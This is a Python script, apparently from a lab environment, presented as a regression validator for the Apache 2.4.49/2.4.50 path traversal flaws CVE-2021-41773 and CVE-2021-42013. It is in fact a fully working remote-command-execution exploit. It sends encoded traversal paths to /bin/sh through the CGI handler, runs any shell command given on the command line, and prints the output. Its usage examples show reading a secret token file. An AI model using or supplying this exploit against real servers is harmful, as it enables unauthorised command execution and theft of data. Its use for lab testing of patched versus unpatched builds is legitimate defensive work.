#!/usr/bin/env python3
"""
validate_cgi_handling.py — CGI Handler Routing Regression Validator
====================================================================
CVE-2021-41773 / CVE-2021-42013 — Apache HTTP Server 2.4.49 / 2.4.50

PURPOSE
-------
This script validates the CGI handler routing vector of the documented
path-traversal vulnerability.

When mod_cgi is loaded and a traversal path resolves to an executable
(e.g. /bin/sh), Apache routes the request through the CGI handler and
executes the binary. POST body content is forwarded to the process stdin.
By prepending "echo;" to the command, the CGI response headers are
satisfied and the command output appears in the response body.

This script confirms:
  1. On the VULNERABLE container (2.4.49): the CGI handler routes the
     traversal path to /bin/sh and returns command output (HTTP 200).
  2. On the PATCHED container (2.4.51): the request is rejected (400/403)
     because the path traversal normalization is fixed, and mod_cgi is not
     loaded in the hardened configuration.

HOW THE CGI VECTOR WORKS
-------------------------
  Request:
    POST /cgi-bin/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: <n>

    echo; id

  1. Apache receives the URI: /cgi-bin/.%2e/.%2e/.%2e/bin/sh
  2. The ScriptAlias /cgi-bin/ matches the prefix.
  3. ap_normalize_path decodes .%2e -> .. but does NOT re-check the
     resulting ".." segment for traversal — the flaw.
  4. The normalized path becomes: /bin/sh
  5. Apache treats /bin/sh as a CGI script and executes it.
  6. The POST body ("echo; id") is piped to /bin/sh stdin.
  7. "echo;" outputs a blank line (satisfying CGI header/body separator).
  8. "id" returns uid=1(daemon) gid=1(daemon) ...

USAGE
-----
  python validate_cgi_handling.py [OPTIONS]

  Options:
    --url URL        Target base URL (default: http://127.0.0.1:8080)
    --cmd CMD        Shell command to run (default: "id")
    --mode {41773,42013,both}
                     Which CVE request pattern to use (default: both)
    --timeout SECS   HTTP request timeout in seconds (default: 15)
    --verbose        Print full raw HTTP response headers

  Examples:
    python validate_cgi_handling.py --url http://127.0.0.1:8080
    python validate_cgi_handling.py --url http://127.0.0.1:8080 --cmd "id; uname -a; whoami"
    python validate_cgi_handling.py --url http://127.0.0.1:8080 --cmd "cat /var/secret/confidential_token.txt"
    python validate_cgi_handling.py --url http://127.0.0.1:8081 --cmd "id"

DEPENDENCIES
------------
  Standard library only — no pip install required.
"""

import argparse
import http.client
import sys
import urllib.parse
from datetime import datetime


# =============================================================================
# ANSI colour helpers
# =============================================================================
def _supports_colour() -> bool:
    import os
    return sys.stdout.isatty() and (os.name != "nt" or _win_ansi_enabled())


def _win_ansi_enabled() -> bool:
    try:
        import ctypes
        ctypes.windll.kernel32.SetConsoleMode(
            ctypes.windll.kernel32.GetStdHandle(-11), 7
        )
        return True
    except Exception:
        return False


RED    = "\033[91m" if _supports_colour() else ""
GREEN  = "\033[92m" if _supports_colour() else ""
YELLOW = "\033[93m" if _supports_colour() else ""
CYAN   = "\033[96m" if _supports_colour() else ""
BOLD   = "\033[1m"  if _supports_colour() else ""
RESET  = "\033[0m"  if _supports_colour() else ""


# =============================================================================
# Payload builders
# =============================================================================

def _build_cgi_path_41773() -> str:
    """
    CVE-2021-41773 CGI traversal path.
    /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh

    Traversal depth from /usr/local/apache2/cgi-bin/:
      .%2e -> /usr/local/apache2/
      .%2e -> /usr/local/
      .%2e -> /usr/
      .%2e -> /   (filesystem root)
      bin/sh -> /bin/sh
    """
    return "/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"


def _build_cgi_path_42013() -> str:
    """
    CVE-2021-42013 CGI traversal path (2.4.50 bypass via double-encoding).
    /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh

    Same 4-level depth, using double-encoded dots.
    """
    return "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"


# =============================================================================
# HTTP POST request (raw — preserves malformed encoding)
# =============================================================================

def send_cgi_request(host: str, port: int, path: str, command: str,
                     timeout: int, use_tls: bool = False) -> tuple:
    """
    Send a POST request with the path-traversal URI and the given shell
    command in the request body.

    The body format is: "echo; <command>"
      - "echo" outputs a blank line, which satisfies the CGI response format
        requirement (headers must be separated from body by a blank line).
      - The command follows on the same stdin stream.

    Returns:
      (status_code: int, headers: dict, body: str)
    """
    body = f"echo; {command}"
    body_bytes = body.encode("utf-8")

    try:
        if use_tls:
            conn = http.client.HTTPSConnection(host, port, timeout=timeout)
        else:
            conn = http.client.HTTPConnection(host, port, timeout=timeout)

        headers = {
            "Host": f"{host}:{port}",
            "User-Agent": "CVE-Lab-Validator/1.0 (Research Only)",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(body_bytes)),
            "Connection": "close",
        }

        conn.request("POST", path, body=body_bytes, headers=headers)
        resp = conn.getresponse()
        resp_body = resp.read().decode("utf-8", errors="replace")
        resp_headers = dict(resp.getheaders())
        conn.close()
        return resp.status, resp_headers, resp_body

    except ConnectionRefusedError:
        print(f"\n{RED}[ERROR] Connection refused — is the container running?{RESET}")
        print(f"        Target: {host}:{port}")
        sys.exit(2)
    except OSError as exc:
        print(f"\n{RED}[ERROR] Network error: {exc}{RESET}")
        sys.exit(2)


# =============================================================================
# Result analysis
# =============================================================================

def analyse_cgi_response(status: int, body: str, command: str,
                          cve_mode: str) -> dict:
    """
    Determine whether the CGI routing vector was triggered.

    VULNERABLE indicators:
      - HTTP 200, AND
      - Body contains output consistent with the command (e.g. "uid=" for "id")

    PATCHED indicators:
      - HTTP 400 (traversal path rejected at normalization)
      - HTTP 403 (directory ACL blocked)
      - HTTP 500 (mod_cgi not loaded — Internal Server Error, not execution)
      - Body does NOT contain command output
    """
    result = {
        "cve_mode": cve_mode,
        "http_status": status,
        "cgi_executed": False,
        "verdict": "UNKNOWN",
        "output_snippet": "",
    }

    if status == 200:
        # Check for recognisable command output
        cmd_indicators = {
            "id":      ["uid=", "gid=", "groups="],
            "whoami":  ["root", "daemon", "www-data"],
            "uname":   ["Linux", "GNU", "x86"],
            "cat":     ["FLAG{", "root:", "daemon:"],
            "echo":    [],  # echo alone may not be diagnostic
            "hostname": [],
        }
        cmd_lower = command.lower().split()[0]  # first word of command
        hints = cmd_indicators.get(cmd_lower, [])

        output_confirmed = (
            any(h in body for h in hints) if hints
            else len(body.strip()) > 5
        )

        if output_confirmed:
            result["cgi_executed"] = True
            result["verdict"] = "VULNERABLE — CGI handler routed traversal path and executed command"
            snippet_lines = [l for l in body.splitlines() if l.strip()][:4]
            result["output_snippet"] = "\n        ".join(snippet_lines)
        else:
            result["verdict"] = f"INCONCLUSIVE (HTTP 200, body length={len(body)})"

    elif status == 400:
        result["verdict"] = "PATCHED / SECURE — HTTP 400 Bad Request (traversal path rejected)"
    elif status == 403:
        result["verdict"] = "PATCHED / SECURE — HTTP 403 Forbidden (ACL blocked traversal)"
    elif status == 500:
        result["verdict"] = (
            "LIKELY PATCHED — HTTP 500 (mod_cgi not loaded or execution failed; "
            "no code ran)"
        )
    elif status == 404:
        result["verdict"] = "PATCHED / SECURE — HTTP 404 (traversal path not resolved)"
    else:
        result["verdict"] = f"INCONCLUSIVE (HTTP {status})"

    return result


# =============================================================================
# Pretty printer
# =============================================================================

def print_result(result: dict, path: str, command: str,
                 verbose: bool, headers: dict) -> None:
    status  = result["http_status"]
    verdict = result["verdict"]
    mode    = result["cve_mode"]

    colour = GREEN if not result["cgi_executed"] else RED
    symbol = "[OK] " if not result["cgi_executed"] else "[!!]"

    print(f"\n  {BOLD}[{mode}]{RESET}")
    print(f"  Path sent  : {CYAN}{path}{RESET}")
    print(f"  Command    : {command}")
    print(f"  HTTP       : {status}")
    print(f"  Verdict    : {colour}{BOLD}{symbol} {verdict}{RESET}")

    if result["output_snippet"]:
        print(f"  Output     :")
        print(f"        {YELLOW}{result['output_snippet']}{RESET}")

    if verbose:
        print(f"\n  Response Headers:")
        for k, v in headers.items():
            print(f"    {k}: {v}")


# =============================================================================
# Main
# =============================================================================

def main() -> int:
    parser = argparse.ArgumentParser(
        description="CVE-2021-41773/42013 CGI Handler Routing Regression Validator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python validate_cgi_handling.py --url http://127.0.0.1:8080
  python validate_cgi_handling.py --url http://127.0.0.1:8080 --cmd "id; uname -a; whoami"
  python validate_cgi_handling.py --url http://127.0.0.1:8080 --cmd "cat /var/secret/confidential_token.txt"
  python validate_cgi_handling.py --url http://127.0.0.1:8081 --cmd "id"
        """,
    )
    parser.add_argument(
        "--url", default="http://127.0.0.1:8080",
        help="Target base URL (default: http://127.0.0.1:8080)"
    )
    parser.add_argument(
        "--cmd", default="id",
        help='Shell command to run via CGI handler (default: "id")'
    )
    parser.add_argument(
        "--mode", choices=["41773", "42013", "both"], default="both",
        help="CVE request pattern variant (default: both)"
    )
    parser.add_argument(
        "--timeout", type=int, default=15,
        help="Request timeout in seconds (default: 15)"
    )
    parser.add_argument(
        "--verbose", action="store_true",
        help="Print full response headers"
    )
    args = parser.parse_args()

    parsed = urllib.parse.urlparse(args.url)
    host = parsed.hostname or "127.0.0.1"
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    use_tls = parsed.scheme == "https"

    print(f"\n{BOLD}{'='*65}{RESET}")
    print(f"{BOLD}  CVE-2021-41773/42013 — CGI Handler Routing Validator{RESET}")
    print(f"{BOLD}{'='*65}{RESET}")
    print(f"  Target    : {args.url}")
    print(f"  Command   : {args.cmd}")
    print(f"  Mode      : {args.mode}")
    print(f"  Timestamp : {datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ')}")
    print(f"{BOLD}{'='*65}{RESET}")

    modes_to_run = (
        ["41773", "42013"] if args.mode == "both"
        else [args.mode]
    )

    overall_executed = False
    for mode in modes_to_run:
        path = _build_cgi_path_41773() if mode == "41773" else _build_cgi_path_42013()

        print(f"\n  {BOLD}--- Sending {mode} CGI probe ---{RESET}")
        status, headers, body = send_cgi_request(
            host, port, path, args.cmd, args.timeout, use_tls
        )
        result = analyse_cgi_response(status, body, args.cmd, f"CVE-2021-{mode}")
        print_result(result, path, args.cmd, args.verbose, headers)

        if result["cgi_executed"]:
            overall_executed = True

    print(f"\n{BOLD}{'='*65}{RESET}")
    if overall_executed:
        print(f"  {RED}{BOLD}[!!] FINAL VERDICT: VULNERABLE -- CGI routing confirmed{RESET}")
        print(f"  {RED}Upgrade Apache to 2.4.51+ and disable mod_cgi if not needed.{RESET}")
    else:
        print(f"  {GREEN}{BOLD}[OK] FINAL VERDICT: PATCHED / SECURE{RESET}")
        print(f"  {GREEN}CGI handler routing via traversal was correctly blocked.{RESET}")
    print(f"{BOLD}{'='*65}{RESET}\n")

    return 1 if overall_executed else 0


if __name__ == "__main__":
    sys.exit(main())
